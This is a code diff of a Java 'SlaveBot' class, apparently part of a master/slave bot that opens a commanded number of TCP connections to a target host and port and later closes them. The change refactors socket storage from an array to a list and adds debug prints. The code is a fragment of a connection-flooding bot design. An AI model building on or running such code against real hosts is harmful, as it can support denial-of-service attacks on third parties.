@@ -18,7 +18,7 @@ public class SlaveBot implements Runnable {
 		public String port;                                                                                                  
 		public String targetHost; 
 		public String numConnections;
-		public Socket[] arrSoc;
+		public ArrayList<Socket> arrSoc;
 
 		public targetData(String action, String targetHost, String port, String numConnections) {                                                                           
 			this.port = port;                                                                                             
@@ -118,12 +118,16 @@ public class SlaveBot implements Runnable {
 		Integer numConnectionInt = Integer.parseInt(numConnection);
 		Integer portInt = Integer.parseInt(port);
 		targetData obj = targetDataMap.get(conKey);
-		obj.arrSoc = new Socket[numConnectionInt];
+		
+		//obj.arrSoc = new Socket[numConnectionInt];
+		obj.arrSoc = new ArrayList<Socket>();
 		if (targetDataMap.containsKey(conKey)){
 			try{
-				for(int i = 0; i < obj.arrSoc.length; i++){
-					obj.arrSoc[i] = new Socket(ip, portInt);
-					System.out.println(obj.arrSoc[i]);
+				for(int i = 0; i < Integer.parseInt(numConnection); i++){
+					Socket socObj = new Socket(ip, portInt);
+					obj.arrSoc.add(socObj);
+					//obj.arrSoc[i] = new Socket(ip, portInt);
+					//System.out.println(obj.arrSoc[i]);
 				}
 				
 			}
@@ -134,7 +138,7 @@ public class SlaveBot implements Runnable {
 		else{
 			System.out.println("Error Connecting to host");
 		}
-
+		System.out.println("Blah");
 	}
 
 	public static void performDisconnect(String ip, String port, Integer numberOfConnToDelete) {
@@ -145,14 +149,16 @@ public class SlaveBot implements Runnable {
 		if (targetDataMap.containsKey(uniqueKey)){
 			try{
 				for(int i = 0; i< numberOfConnToDelete; i++){
-					Socket deleteSoc = obj.arrSoc[i];
+					Socket deleteSoc = (Socket)obj.arrSoc.get(i);
 					deleteSoc.close();	
+					obj.arrSoc.remove(deleteSoc);
 					System.out.println("Socket closed" + deleteSoc);
 				}
-				targetDataMap.remove(uniqueKey);
+				//targetDataMap.remove(uniqueKey);
+
 			}
 			catch(Exception e){
-
+				System.out.println("Something went wrong");
 			}
 
 		}
